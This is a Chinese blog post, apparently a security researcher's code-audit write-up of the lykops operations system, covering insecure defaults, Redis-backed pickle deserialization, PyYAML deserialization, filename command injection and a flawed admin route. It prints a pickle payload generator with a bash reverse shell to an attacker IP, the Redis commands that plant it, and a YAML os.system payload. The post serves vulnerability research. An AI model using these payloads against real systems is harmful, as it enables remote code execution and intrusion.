---
title: "【投稿】某运维系统的代码审计笔记（Django+MongoDB+Redis）"
slug: nqxgtn
translationKey: nqxgtn
date: 2021-02-05T05:14:41+08:00
source: yuque/penetration
---

本文首发投稿于阿里云先知社区[某运维系统的代码审计笔记（Django+MongoDB+Redis）](https://xz.aliyun.com/t/9195)，转载请注明出处。



这套系统，是在某次行动的时候遇到的，当时是通过弱密码+后台命令注入来实现getshell。

后续觉得还蛮有意思，抽个周六审计了下，却发现在某些情况下居然可以直接前台RCE。。。

下面就介绍此次审计的过程。

# 0x00    系统简介
系统名字叫：**lykops运维系统**

+ 代码仓库地址：[https://github.com/lykops/lykops](https://github.com/lykops/lykops/issues/new)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612585076722-b0c1cea9-da7d-4dec-8b5f-f9c2a5609d95.png)

+ 默认账号、密码如下

```basic
lykops
1qaz2wsx
```

前台登录界面

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612473328894-c9b48c7f-4e23-4d01-9d8a-c155b5073df1.png)

后台登陆后的界面

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612572847531-b796841e-c17b-48d5-b39b-300bfe47f12b.png)

+ 数据库方面，不同于普通的`Django`+`SQLite/MySQL`方案，它使用的是`MongoDB`+`Redis`
    - Mongo里存用户数据
    - Redis作为缓存

在这种搭配下，攻击面就从单独的web，变成了web+2个服务。



# 0x01    默认配置
假如你直接将这个项目repo clone下来直接使用，就会遭受**默认配置**所导致的风险。



## Debug模式默认开启
不解释，在`lykops/settings.py`中，`Debug`默认是开启的。

```basic
# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True
```

怎么利用呢？

——让django报错，进而泄露敏感信息！这里采用的是POST数组参数的方式，可以看到已经泄露了密码的Hash

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612474757034-754938b5-3c16-4985-a504-41d7a939e8b7.png)

## 密钥硬编码
源代码在这里，也是`lykops/settings.py`

[https://github.com/lykops/lykops/blob/ed7e35d0c1abb1eacf7ab365e041347d0862c0a7/lykops/settings.py#L29](https://github.com/lykops/lykops/blob/ed7e35d0c1abb1eacf7ab365e041347d0862c0a7/lykops/settings.py#L29)

```basic
# lykops/settings.py
SECRET_KEY = '-mii=_9j2@!^7#lbjgo6=6930#@)dle18^wdj^b@xa68=-3bed'
```

原repo里的`SECRET_KEY`在上面，这个值按理说是在每一个Django项目创建之初的时候自动生成的，可是这里直接硬编码了，要是图省事不更改的话，就。。。事实上，十年前有洋人就讨论过这个问题，最佳实践=>[distributing-django-projects-with-unique-secret-keys](https://stackoverflow.com/questions/4664724/distributing-django-projects-with-unique-secret-keys)

话说回来，这个密钥的作用是啥呢，咱们先看看[官方文档](https://docs.djangoproject.com/zh-hans/3.1/topics/signing/#protecting-the-secret-key)。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612474620717-7f92e854-f133-490b-b90b-085ca06215d7.png)

没错，理论上可以用它来伪造签名！通过学习廖新喜前辈[从Django的SECTET_KEY到代码执行 | xxlegend](http://xxlegend.com/2015/04/01/%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)一文，自己也跟了一下django 1.11的源代码，得到以下结论

> + 在django1.6以下，session默认是采用pickle执行序列化操作，在1.6及以上版本默认采用json序列化。
>
> ![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612594528715-b7f81250-8826-4be7-8673-4ce2bc7d68f9.png)
>
> + 代码执行只存在于使用pickle序列化的操作中，即django<=1.6
> + 这类泄露密钥问题的利用工具：[https://github.com/danghvu/pwp](https://github.com/danghvu/pwp)，蛮不错的的实现思路
>

总而言之，搭载`django 1.11`的目标环境，并不会因为密钥泄露而产生RCE的问题。不过当下的渗透角度来看，我并没有迫切需要研究**身份伪造**的需求（弱密码......），因此就暂不深入分析**身份伪造**的利用方案了。（个人习惯：喜欢实际遇到某一类问题后，再去想办法分析解决），有这方面了解的大佬，请不吝在评论区抬一手。

# 0x02    Redis未授权=>前台RCE
登录处的pickle反序列化漏洞！

## 逻辑分析
咱们先看看登录的路由，是`^login.html`，对应的逻辑是`Login`类的`login`函数

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612475501374-847a4401-d2cb-46d2-9299-c115ac80e722.png)

那么跟进`login`函数，其实反序列化这块，主要关注第81行就好。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612475618950-4c5eb9e1-833a-4853-b22a-76c7f915775a.png)

第81行，传入了`user=adminuser`变量，咱们通过全局搜索变量名得到`adminuser`的值，默认是`lykops`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612475445739-a086de68-6acf-42cd-a523-729b5cd8aa8f.png)那么跟进`get_userinfo`，发现就是去redis中取用户的登录缓存

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612476033853-cf359b4e-05c0-4a48-802a-e92f49068352.png)

那么咱们想想看，用户数据，在Python的上下文中，存在的形式必然是**Python对象**；而在Redis中，储存形式很可能是字符串。至此，理解上都没问题吧？

> Redis支持五种数据类型：**string（字符串）**，hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)
>

再进一步，Redis使用的**字符串**，要转换成Python中的**对象**，就必然存在反序列化的实现，若反序列化限制不当，就会存在漏洞——那它反序列化用的啥函数呢？![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612475982326-f7769925-4e51-4131-a1c8-2847d59d761a.png)

这个`get`的实现，在入参是`fmt=obj`时，会反序列化【从Redis中取得的`字符串`】，而反序列化函数，居然是用的`pickle.loads`！

> 如果你还不了解Python的反序列化攻击，可以参考[从零开始python反序列化攻击](https://zhuanlan.zhihu.com/p/89132768)这篇帖子。
>
> 下面的图，是在Python cmdline中利用反序列化来命令执行的小demo
>
> ![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612476909279-aca2a57b-0dfb-4bbc-85f5-18be7a866696.png)
>

简单来说，咱们要做的，就是

+ 利用Python中class的`__reduce__`方法，在pickle反序列化的时候会被执行的特点，先构造恶意字符串，再通过反序列化造成命令执行。
+ `pickle.loads`的入参类型要求是`Byte`，而Redis取出的结果类型，默认也是`Byte`，因此无需额外的转码。
+ 实际利用中，只需要有Redis未授权访问，就咱们能通过覆写`lykops`的`value`的方式，传入恶意字符串让Python去反序列化，继而完成命令执行！



## 漏洞利用


生成payload的代码如下

```basic
#!/usr/bin/env python3
import pickle
import os

class py():
	def __reduce__(self):
		return (os.system, ('bash -i >& /dev/tcp/10.10.111.2/1337 0>&1',))

payload = pickle.dumps(py()) 
# b'\x80\x03cposix\nsystem\nq\x00X)\x00\x00\x00bash -i >& /dev/tcp/10.10.111.1/1337 0>&1q\x01\x85q\x02Rq\x03.'
```



下面演示攻击过程，首先利用硬编码的Redis密码`1qaz2wsx`去连接Redis，里面原本是有值滴，用户的hash可以拿去用`hydra`爆破，此处不多介绍。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612580856779-b800fe78-e01c-4d83-b345-f2792b9bc169.png)

写入用于反弹shell的恶意字符串

```basic
# 写入key
set lykops:userinfo "\x80\x03cposix\nsystem\nq\x00X)\x00\x00\x00bash -i >& /dev/tcp/10.10.111.1/1337 0>&1q\x01\x85q\x02Rq\x03."

# 查看key
get lykops:userinfo

# 重置key，后续用于恢复网站
set lykops:userinfo 1
```

点击登录，触发RCE！

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612582105547-4feb00ab-230e-4b41-98d8-d4d498eef68b.png)

这里需要多说一句。由于某种原因，django会不停地去反序列化`lykops:userinfo`中的数据——这个过程是阻塞的，所以我们在拿到shell后，会看到网站卡死。为了恢复网站，就需要重置key。



看到这里，你就会发现这种利用思路，跟P牛的[掌阅iReader某站Python漏洞挖掘 | 离别歌](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html)一文，还是蛮相似的对吧。没错，我之所以想到去关注这个点，正是脑海里想起了P牛那篇文章。年轻人要多向前辈学习; D



# 0x03    后台YAML反序列化
Python在反序列化YAML格式的内容时，存在反序列化漏洞。参考[浅谈PyYAML反序列化漏洞](https://xz.aliyun.com/t/7923#toc-5)一文，得到以下要点

> + 在PyYAML 5.1版本之前我们有以下反序列化方法：
>
> load(data)
>
> load(data, Loader=Loader)
>
> load_all(data)
>
> load_all(data, Loader=Loader)
>
> + yaml反序列化时，会根据参数来动态创建新的Python类对象或通过引用module的类创建对象，从而可以执行任意命令~
>

因此，只要Python代码中存在`yaml.load()`且参数可控，则可以利用`yaml`反序列化来实现RCE。

## 逻辑分析
首先，在上一个问题的测试中，注意到一件事

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612593173999-aedf70b5-2b8d-4eb3-9017-2cb86c8377fc.png)

Python会进行Yaml的语法检查，解析yaml文件很可能用的就是`yaml.load`！

那么果断跟代码——全局搜`yaml.load`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612592899261-cced0b08-9cea-4672-9268-14b19b869b77.png)

外面有一个门面方法`yaml_loader`，

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612592953829-15ac886f-3762-4f26-9302-a644e8a7d95a.png)

没有过滤，而且一堆调用，那基本不用再跟了。

不过，还利用前，还要查看下版本，因为以PyYAML 5.1为界限，版本上、下的利用方式不太一样。

该项目是否指定了PyYAML的版本呢，查看[requirements.txt](https://github.com/lykops/lykops/blob/master/doc/install/requirements.txt)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612592443562-d67902f7-2961-4815-ab98-3089d6d71f79.png)

发现并未指定版本。那么就去本机上找

```basic
>>> python3 -m pip list |grep PyYAML
PyYAML   3.12
```

是Py3默认的`PyYAML 3.12`，符合最理想的反序列化情况，搞起！

## 漏洞利用
还是刚刚0x02中的上传点，只需构造以下内容发送即可

```basic
!!python/object/new:os.system ["sleep 2"]
```

RCE！

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612591756907-9e8c62dc-6c3e-40d1-8f3c-3130a1cfc346.png)

只不过这个命令执行的点，只执行一次命令，显得更加纯粹。

# 0x04    后台命令注入漏洞
## 逻辑分析
全局搜索常见的命令执行函数

```basic
os\.system|os\.popen|subprocess\.|exec\(|commands\.|os\.spawn
```

看到一处有趣的点，直接传入了文件路径？

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612583439689-0c316848-a62a-43bd-8526-43f79521cfba.png)

我们跟进到`lykops/library/utils/file.py#248`里的`upload_file`函数，可看到此处并没有任何过滤

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612583548282-85f9eda0-1c90-4d4a-a6b8-edef5d537447.png)

那么`file`变量是从哪儿来的呢？

查看函数的调用，跟到`import_upload`，再往上追

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612583785070-0d6cf023-2fec-4ea7-813c-513b5a7d7d62.png)

最后在`lykops/lykops/ansible/yaml.py#74`发现了这个漏洞的入口点，file变量来自于咱们的HTTP请求，。

对应的路由是`^ansible/yaml/import$`。

可以看到，如果上传时出错，则会调用两次`import_file`函数，也就是执行两遍命令。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612584021432-4b7e9a15-5da6-499c-961a-7f47eb7cf310.png)

## 漏洞利用
咱们直接访问，上传并抓包

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612584182665-cb0e62ec-6dd5-46ee-adec-90cbff59fcb2.png)

更改文件名，完成命令注入。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612584454869-2e94095e-20ea-4eaa-b1e0-484e86b7af1a.png)







# 0x0？    添加管理员接口未授权
在安装这套系统的时候，发现一开始可以添加管理员，

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612580475063-084fb040-8874-49d8-9e3f-7407b77e782e.png)

路由在这里

```python
url(r'^user/create_admin', Login(mongoclient=mongoclient, redisclient=redisclient).create_admin, name='create_admin'),
```

那么查看`创建管理员`对应的实现代码

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612586203746-b47dd619-370c-486b-a8ad-f8f301d4db0a.png)

显然有问题。它先判断请求方式，如果是`GET`请求，就去MongoDB中查，当前是否存在超管用户（上面有提到默认值是`lykops`），如果不存在就渲染**创建管理员**的模板。

我的好开发，可再别写那么复杂了，POST请求，你压根就没鉴权。



但是但是，没注意后面强制指定了是去创建`adminuser`，实际根本就不能利用。。。![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612588081205-cf445822-91ac-45a1-b98b-56d50f49b477.png)

---

# 总结
感谢观看！

这一波代码审计下来，getshell的姿势可谓多种多样；但不论怎样，核心都是运维/开发人员缺乏安全意识，贪图方便。

同时呢，我在其中也学习到了一些最佳实践，例如分发Django项目时动态引入`SECRET_KEY`时，最好使用系统的环境变量。

此外，假如再抬一下——升华到安全设计。从这个脆弱的项目，我又想到一个例子：想一想为什么宝塔面板的账号密码，不是保存在配置文件中，而是要求运行一条命令`bt default`才出得来呢？原因之一，不就是为了防止被类似**本地任意文件读取**的漏洞搞下来吗？

须知漏洞往往是串联起来发挥作用的，因此安全设计就是要想办法减少彼此之间的安全依赖——护城河失陷了，还有城门，城门破开了，还有哨兵。

所以，我个人感觉：学安全，除了要学安全技术，还不能忽略安全理念，举一反三，才能产生质变啊。

# Refs
+ Minimized risk of SECRET_KEY leak. [https://github.com/django/django/pull/2714](https://github.com/django/django/pull/2714)
+ [https://github.com/danghvu/pwp/blob/master/exploit.py](https://github.com/danghvu/pwp/blob/master/exploit.py)
+ 浅谈PyYAML反序列化漏洞 - 先知社区 [https://xz.aliyun.com/t/7923#toc-10](https://xz.aliyun.com/t/7923#toc-10)
+ 从Django的SECTET_KEY到代码执行 | xxlegend[http://xxlegend.com/2015/04/01/%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/](http://xxlegend.com/2015/04/01/%25E4%25BB%258EDjango%25E7%259A%2584SECTET_KEY%25E5%2588%25B0%25E4%25BB%25A3%25E7%25A0%2581%25E6%2589%25A7%25E8%25A1%258C/)

# 附录：部署指南
本人在部署这套代码的时候，踩了一些小坑，因此在官方的安装说明上，添加了一些内容，已经放到附件。

有兴趣自己分析的师傅们，可以自己搭环境复现下。

最后一件事，这套代码基本只被用在内网里（反正我在fofa上一台都找不到）。

因此，**请在本地搭建，勿用于生产环境！**

[部署手册.md](https://www.yuque.com/attachments/yuque/0/2021/md/166008/1612595303702-588ec474-ddd1-4b50-87e4-b3b084a810a0.md)

# 
